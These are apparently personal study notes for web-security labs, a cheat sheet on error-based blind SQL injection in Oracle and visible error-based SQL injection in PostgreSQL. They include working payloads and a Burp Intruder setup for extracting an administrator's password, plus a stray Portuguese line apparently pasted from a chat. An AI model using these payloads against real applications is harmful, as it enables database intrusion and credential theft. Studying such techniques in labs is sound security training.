# Error-Based Blind SQLi (Oracle)

## Mechanism
- Trigger a database error (HTTP 500) when a condition is **true**
- No error (HTTP 200) when the condition is **false**
- Extract data one character at a time by testing conditions

## Key Syntax (Oracle)

### Concatenation into query
```
'||(SELECT ... FROM dual)||'
```

- `||` concatenates strings in Oracle
- `From dual` is required for all SELECT statements in Oracle
- The outer `||'` closes concatenation cleanly

### Conditional error
```sql
CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END
```

- `TO_CHAR(1/0)` - division by zero wrapped in TO_CHAR to force runtime evaluation
- `ELSE ''` - no error when condition is false
- **Without TO_CHAR**, Oracle may reject the query at parsing time

### Test if injection works

```
'                           -> 500 (unclosed quote)
''                          -> 200 (valid syntax)
'||(SELECT '' FROM dual)||' -> 200 (valid Oracle)
```

### Confirm conditional error mechanism

```
1=1 -> 500 (error)
1=2 -> 200 (no error)
```

### Check if user/table exists

```sql
(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
```

- 500 = row exists
- 200 = row does not exist

### Password length

```sql
(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
```

- Increase N until 200 appears -> password length = N (the last value that gave 500)

### Extract character at position N

```sql
(SELECT CASE WHEN SUBSTR(password,N,1)='X' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')
```

- SUBSTR(string, position, length) - Oracle's substring function

## Burp Intruder Setup

- **Attack type:** Sniper
- **Payload position:** The character being tests (`§a§`)
- **Payloads:** a-z, 0-9 (lowercase alphanumeric only for most labs)
- **Grep Match:** `Internal Server Error` (filters false positives)
- **Result:** The row with Grep Match hit = correct character

## Common Pitfalls

- Forgetting `FROM dual` -> always 500
- Forgetting `TO_CHAR()` around `1/0` -> always 500 (parsing error)
- Using `=` in Intruder without Grep Match -> false positives
- Two characters giving 500 for the same position -> test with `>` and `<` in Repeater to confirm

Sim. Adiciona isto ao ficheiro `CheatSheet/sqli/error-based.md`:

---

# Visible Error-Based SQLi (PostgreSQL)

### Mechanism
- Force a type conversion error using `CAST()` to leak data directly in the error message
- No need for conditional responses or character-by-character extraction
- One request = one piece of data (or the whole password if you limit to 1 row)

### Key Syntax (PostgreSQL)
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### How it works
- `CAST(... AS int)` attempts to convert a string to an integer
- PostgreSQL throws:\
`ERROR: invalid input syntax for type integer: "the_string"`
- The string value appears directly in the error response

### Critical Thinking Flow (The "What To Try" List)
1. **Test Basic Injection:** `'` and `''` to see if errors are returned
2. **Confirm Verbose SQL:** Check if the error message shows the SQL query.
3. **Fix Syntax:** Use `'--` to comment out the rest of the original query
4. **Check for Character Limits:** If the payload is truncated in the error message, you've hit a limite
5. **Bypass the Limit:** **Delete the original value.** Replace a long TrackingId with a single character or just the injection itself (`' AND 1=CAST(...)`). This saves crucial space.
6. **Fix Boolean Logic:** `CAST(...)` alone might cause a boolean error. Add a comparison like `1=` to make the expression valid (`1=CAST(...)`).
7. **Handle Multiple Rows:** The `CAST` will fail if the subquery returns more than one row. Use `LIMIT 1` to return a single value.

### Character Limit Bypass
- If the cookie has a character limit, **replace the TrackingId with a single character** (e.g., `1`). The application does not validate the format.
- This frees up ~20 characters for the payload.

### Confirm Database Type
```sql
' AND 1=CAST(version() AS int)--
```
- If verbose errors are enabled, the version string appears in the error.
- This confirms both the database type and that the technique works.

### Extract Data from a Specific Row
```sql
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```
- If the `WHERE` clause makes the payload too long, use `LIMIT 1 OFFSET N` instead and extract rows one by one.

### Extract Without Knowing Column Names (if needed)
```sql
' AND 1=CAST((SELECT * FROM users LIMIT 1) AS int)--
```
- PostgreSQL will error on the whole row type, but may still leak column values in some configurations.

### Common Pitfalls
- Forgetting to replace a long TrackingId with a short one → truncation
- Using `--` without a trailing space → comment not recognized in PostgreSQL
- Forgetting `LIMIT 1` → subquery returns multiple rows, causing a different error
